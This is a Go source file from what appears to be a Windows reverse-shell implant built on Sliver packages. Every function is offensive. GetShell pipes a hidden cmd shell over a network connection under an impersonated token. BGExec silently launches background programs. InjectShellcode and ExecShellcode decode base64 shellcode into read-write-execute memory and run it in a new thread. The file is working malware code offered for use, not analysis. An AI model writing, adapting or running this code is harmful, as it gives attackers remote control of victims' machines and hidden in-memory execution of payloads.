package shell

import (
	"context"
	"encoding/base64"
	"os/exec"
	"syscall"
	"unsafe"

	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/shell"
	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
)

func GetShell() (*shell.Shell, error) {
	ctx, cancel := context.WithCancel(context.Background())

	shPath := shell.GetSystemShellPath("")
	cmd := exec.CommandContext(ctx, shPath[0])
	cmd.Stdin = myconn.Conn
	cmd.Stdout = myconn.Conn
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}

	err := cmd.Start()

	return &shell.Shell{
		Command: cmd,
		Cancel:  cancel,
	}, err
}

// func BGExec() *exec.Cmd {
func BGExec(prog string, args []string) (int, error) {
	cmd := exec.Command(`c:\windows\system32\cmd.exe`)
	cmd.Args = append(cmd.Args, "/c", "start", "/B", prog)
	cmd.Args = append(cmd.Args, args...)
	err := cmd.Start()
	if err != nil {
		return 1, err
	}
	return 0, err
}

// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
// and executes it via a syscall.Syscall call.
func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[999000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}
